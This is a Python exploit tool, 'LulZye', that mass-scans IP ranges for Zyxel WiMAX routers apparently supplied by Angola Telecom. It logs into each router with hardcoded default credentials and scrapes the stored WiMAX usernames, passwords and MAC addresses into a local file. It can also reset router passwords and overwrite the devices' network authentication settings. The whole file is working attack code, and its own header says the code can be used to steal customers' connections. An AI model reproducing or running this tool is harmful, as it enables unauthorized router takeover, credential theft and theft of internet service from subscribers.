"""
Author: AJAX0xD9 - The Marsian Living in Angola
Lulzye: Proof of concept Exploit for Angola Telecom devices
This tool scans the internet and extracts information on all vulnerable devices and stores them on the local machine.
 
I am a Marsian living in Angola
DISCLAIMER: This code is for demosntration purposes only and should not be used
against any device other than the one that is in your permission
Angola Telecom has the right to punish anyone who uses this code to attack and steal customers internet connections.
I am not responsible for any damage caused by anyone who uses this code for illegal purposes.
Extra: Hack to learn, Don't learn to hack.
"""
__author__ = "AJAX0xD9"
__email__ = "yourk@gmail.com"
 
import urllib
import http.client
import nmap
import os
import sys
import optparse
from datetime import date
 
if sys.hexversion < 0x3040000:
    print('Error: You need python 3.4.0 or above. exit.')
    sys.exit(1)
 
################FORM-DATA#####################
Adv1_Language = 00000000
LoginPassword = 'ZyXEL ZyWALL Series'
LoginUserName = 'admin'
Prestige_Login = 'Login'
md5_ip="66efff4c945d3c3b87fc271b47d456db"
md5_pass = "9d9fa047600b6b1fd52268bc3190518e"
md5_max = "a3aa233dcb84607df45c0bb5d8d414fc"
md5_pass="66efff4c945d3c3b87fc271b47d456db"
##############################################
################FORM-DATA#####################
WAN_AAA_value_UserName = ""
WAN_AAA_value_Password = "password"
WAN_AAA_value_AnonymousIdentity = "anonymous@wimax"
WAN_AAA_PKM = "00000001"
WAN_AAA_EAPPhase1Method = "00000001"
WAN_AAA_EAPPhase2Method = "00000002"
WAN_AAA_Cert = "00000002"
WAN_IP_Auto = 0
WAN_IPAddr = "0.0.0.0"
WAN_IPSubnetMask = "0.0.0.0"
WAN_IPGatewayAddr = "0.0.0.0"
Wimax_Status = " "
sysSubmit = "Apply"
#############################################
def_port = 80
 
 
def setauth(ip, url, port, auth_username, auth_passw, savedir):
    """
   :param ip:
   :param url:
   :param port:
   :param auth_username:
   :param auth_passw:
   :return:
   """
    params = urllib.parse.urlencode({"WAN_AAA_value_UserName": auth_username,
                                     "WAN_AAA_value_Password": auth_passw,
                                     "WAN_AAA_value_AnonymousIdentity": WAN_AAA_value_AnonymousIdentity,
                                     "WAN_AAA_PKM": WAN_AAA_PKM,
                                     "WAN_AAA_EAPPhase1Method" : WAN_AAA_EAPPhase1Method,
                                     "WAN_AAA_EAPPhase2Method": WAN_AAA_EAPPhase2Method,
                                     "WAN_AAA_Cert": WAN_AAA_Cert,
                                     "WAN_IP_Auto": WAN_IP_Auto,
                                     "WAN_IPAddr": WAN_IPAddr,
                                     "WAN_IPSubnetMask": WAN_IPSubnetMask,
                                     "Wimax_Status": Wimax_Status,
                                     "sysSubmit": "Apply"})
 
    headers = {"User-Agent": "Mozilla/5.0 (X11; Solaris; Unix i686; rv:32.0) Gecko/20100101 Firefox/300.0",
               "Content-type": "application/x-www-form-urlencoded",
               "Accept": "text/plain"}
    conn = http.client.HTTPConnection(ip, port)
    conn.request("POST", url, params, headers)
    response = conn.getresponse()
    if response.code == 900:  # Follow Redirect
        conn.request("GET", url, params, headers)  # Add params to header and GET the vulnerable page
        savedata("Set new username and password for Host: " + ip + " to > " + auth_username + " " + auth_passw, savedir)
    conn.close()
 
 
def getpage(ip, url, port, language, lusername, lpassword, presLogin, hpassword, findmac=False):
    """
    This function gets the information for authentication to the Zyxel Routers
    checks for a redirect and returns the pages content
    :param language: The language that the Zxel Routers use for presentation in the control panel 8 * 0's == English Type: int
    :param lusername: The username used for authentication
    :param lpassword: The loginPassword used for authentication
    :param presLogin: value required for authentication
    :param hpassword: md5 of the password
    :return: Returns the html page in byte form
    """
    params = urllib.parse.urlencode({"LoginUserName": lusername,
                                     'LoginPassword': lpassword,
                                     "Adv1_Language": language,
                                     "Prestige_Login": presLogin,
                                     "hiddenPassword": hpassword})
 
    headers = {"User-Agent": "Mozilla/5.0 (X11; Solaris; Unix i686; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Content-type": "application/x-www-form-urlencoded",
               "Accept": "text/plain"}
    conn = http.client.HTTPConnection(ip, port)
    conn.request("POST", url, params, headers)
    response = conn.getresponse()
    data = response.read()
    if response.code == 303 and findmac is False:  # Follow Redirect
        conn.request("GET", "/WiMAX_AAA.html", params, headers)  # Add params to header and GET the vulnerable page
        response = conn.getresponse()
        data = response.read()
    if response.code == 900 and findmac is True:             # Follow redirect and get page where the mac address exists
        conn.request("GET", "/home.html", params, headers)   # Add params to header and GET the vulnerable page
        response = conn.getresponse()
        data = response.read()
 
    return data
 
 
def extractauthdata(page, searchterm):
    """
    Extract the username and password from the html page
    :param page: The variable containing the html page contents
    :param searchterm: The searchterm we wish to find in the page
    :return:The username and password
    """
    u_name = None
    lpass = None
    page = str(page)
    no_matches = -1
    start_content = page.find(searchterm)
    if start_content == no_matches:
        return None, 0
    start_quote = page.find('"', start_content)
    end_quote = page.find('"', start_quote + 1)
    u_name = page[start_quote + 1:end_quote]
    return u_name, end_quote
 
 
def extractmac(page, searchterm):
    """
    Extract the mac address from the html page
    :param page: The variable containing the html page contents
    :param searchterm: The searchterm we wish to find in the page
    :return: The mac address that was found
    """
    page = str(page)
    print("Extracting mac address...")
    start_content = page.find(searchterm)
    if start_content == -1:
        return None, 0
    start_quote = page.find('>00:23:F8', start_content)
    end_quote = page.find('<', start_quote + 1)
    u_name = page[start_quote + 1:end_quote]
    return u_name, end_quote
 
 
def savedata(info, saveDirectory):
    fd = os.open(saveDirectory, os.O_RDWR | os.O_CREAT | os.O_APPEND)
    os.write(fd, bytes(info, "UTF-8"))  # Convert to byte interface and write to disk
    os.write(fd, bytes("\n", "UTF-8"))  # Convert to byte interface and write to disk
    print(info)
    os.close(fd)
 
 
def scan(ip, output, passw=None, do_changepass=False, do_change_auth=False, auth_username=None, auth_pass=None):
        savedir = output
        today = date.today()
        savedata("Initiating scan on the " + str(today), savedir)
        print("Collecting vulnerable hosts...")
        nm = nmap.PortScanner()
        nm.scan(ip, "80", "-PS -n")
        num_of_vulnerable_hosts = 0
        for host in nm.all_hosts():
            if nm[host].state() == "up":
                t_host = str(host)
                print(host)
                savedata("\nFound Vulnerable Host >>", savedir)
                savedata("Host IP: : " + t_host, savedir)
                if do_change_auth is False:
                    page = getpage(t_host, "/Forms/rpAuth_1", def_port,
                                           Adv1_Language, LoginUserName,
                                           LoginPassword, Prestige_Login,
                                           md5_pass, False)
                    extract_auth_info(page, savedir)
		
                    page = getpage(t_host, "/Forms/rpAuth_1", def_port,
                                           Adv1_Language, LoginUserName,
                                           LoginPassword, Prestige_Login,
                                           md5_pass, False)   
                    extract_mac_addr(page, savedir)
                    if do_changepass is True:
                        changepass(t_host, "/Forms/passWarning_1", def_port, passw, savedir)
                if do_change_auth is True:
                    print("Attempting to change wimax authentication information.")
                    setauth(t_host, "/Forms/WAN1_1", def_port, auth_username, auth_pass, savedir)
                num_of_vulnerable_hosts += 1
 
            else:
                print(host, " host down")
        print("Finished scraping data")
        savedata("Found " + str(num_of_vulnerable_hosts) + " potentially Vulnerable devices. \n", savedir)
 
 
def changepass(ip, url,  port, passw, savedir):
    """
    This function changes the Routers password to one especified in the command line
    :param ip: The host to connect to
    :param url: The url pointing to the form
    :param port: The port to connect to
    :param passw: The new password
    :param savedir: The file to save to
    :return: None
    """
    try:
        passw = str(passw)
 
    except ValueError as v:
        print(v)
        sys.exit(2)
 
    params = urllib.parse.urlencode({"PassNew": passw,
                                     'PassConfirm': passw,
                                     "Pass_Apply": "Apply",
                                    })
 
    headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Content-type": "application/x-www-form-urlencoded",
               "Accept": "text/plain"}
    conn = http.client.HTTPConnection(ip, port)
    conn.request("POST", url, params, headers)
    savedata("Set password to : " + passw + "\n", savedir)
    conn.close()
 
 
def extract_mac_addr(page, savedir):
    val = ">00:23:F8:"
    count = 0
    mac = None
    while count != 1:  # We only need to loop once to find the mac
        uname, endpos = extractmac(page, val)
        if uname:
            if count == 0:
                mac = uname
                print("++++++++++++++")
 
            page = page[endpos:]
            savedata("Mac : " + mac, savedir)
            print("--------------")
            count += 1
        else:
            break
 
 
def extract_auth_info(page, savedir):
    val = "value="
    count = 0
    while count != 2:  # We only need to loop twice to find the username and password
        user_name, endpos = extractauthdata(page, val)
        if user_name:
            if user_name == "user":
                print("Skipping this because we don't know the device password...")
                break
            else:
                if count == 0:
                    theusername = user_name
                    print("++++++++++++++")
                    savedata("Username : " + theusername, savedir)
                if count == 1:
                    thepass = user_name
                    print("-------------")
                    savedata("Password : " + thepass, savedir)
            page = page[endpos:]
            count += 1
        else:
            break
 
 
def asciidisplay():
    intro = """
                LulZye: AT Zyxel Router Exploit tool
                Author: AJAX0xD9
                Version: 0.1
                          'â��                    '                         'â��
'â��                                             ''â��
                      'â��                  '                           'â��
Â°                      '                       Â°
      /Â¯Â¯Â¯Â¯/|      '             ____'          /Â¯Â¯Â¯Â¯/|      ' |\Â¯Â¯Â¯Â¯\      '/Â¯Â¯Â¯Â¯/|
    '/____/|Â¯Â¯Â¯Â¯|Â°           |\____\ â��     '/____/|Â¯Â¯Â¯Â¯|Â°|;'\       '\   /       /;'|
 |Â¯Â¯Â¯Â¯|\\'/       '/|           |\Â¯Â¯Â¯Â¯Â¯\   |Â¯Â¯Â¯Â¯|\\'/       '/| '\;;\____'\/____/;;/
 |      '| |        /;;|â��          |;|         |Â° |      '| |        /;;|â��  '\'/Â¯Â¯Â¯Â¯'/\Â¯Â¯Â¯Â¯\/ '
 |       \|       '|;;'/  /Â¯Â¯Â¯Â¯'/|/        '/|  |       \|       '|;;'/    /       '/'|'\       \â��
 |\____/\____\/'  '|____'|/_____/;'|  |\____/\____\/'   '/____'/;;|;;\____\ 'â��
 |;|      |;|       '|   '|       ||         |;'/'  |;|      |;|       '|    |        |;;/\;;|       |
 '\|___,|/|____'|   '|____||_____|/ 'â��  '\|___,|/|____'|    |____'|/    \|____'|
 
            """
    print(intro)
 
 
def setargs():
    parser = optparse.OptionParser()
    parser.add_option("--o", "--o",
                      dest="output",
                      help="File to save to", default='~/Desktop/Lulz.txt')
    parser.add_option("--ip", "--ip",
                      dest="ip",
                      help="IP address or range of IP address's to scan")
    parser.add_option("--p", "--p",
                      dest="passw",
                      help="The password for the router.", default='192.168.1.1')
    parser.add_option("--h", "--h", dest="help", help="Help Section")
    parser.add_option("--set", "--set",
                      dest="setconfig",
                      help="Set the routers UserName and Password used for authentication to Wimax network")
    parser.add_option("--au", "--au",
                      dest="auth_username", help="The user name used for wimax authentication")
 
    parser.add_option("--ap", "--ap",
                      dest="auth_pass", help="The password used for wimax authentication")
 
    (options, args) = parser.parse_args()
    return options, args, parser
 
 
def main():
    options, args, parser = setargs()
    print(len(args))
    if len(args) != 0:
        parser.error("<Usage : --ip {IP address or range of IP address's to scan, \n"
                             " --o {output directory or file eg ~/Desktop/vuln.txt}, \n"
                             "--p {password to authenticate with Zyxel router} \n"
                             "--set {Set the routers UserName and Password for authentication to Wimax Network }, \n"
                             "--au [Set a new UserName for Wimax authentication ], \n"
                             "--ap [Set a new password for wimax authentication ] \n}>")
 
    if options.setconfig is None:
            asciidisplay()
            if options.output is None or options.ip is None or options.help is not None:
                parser.error("<Usage : --ip {IP address or range of IP address's to scan, \n"
                             " --o {output directory or file eg ~/Desktop/vuln.txt}, \n"
                             "--p {password to authenticate with Zyxel router} \n"
                             "--set {Set the routers UserName and Password for authentication to Wimax Network }, \n"
                             "--au [Set a new UserName for Wimax authentication ], \n"
                             "--ap [Set a new password for wimax authentication ] \n}>")
 
            if options.passw is None:
                scan(str(options.ip), str(options.output), None, False)
 
            if options.ip is not None and options.output is not None and options.passw is not None:
                scan(str(options.ip), str(options.output), str(options.passw), True, False, None, None)
 
    if options.setconfig is not 0 and options.output is not None and \
                     options.auth_pass is not None and options.auth_username is not None:
            scan(str(options.ip), str(options.output), str(options.passw), True, True, options.auth_username,
                 options.auth_pass)
 
 
if __name__ == '__main__':
    main()
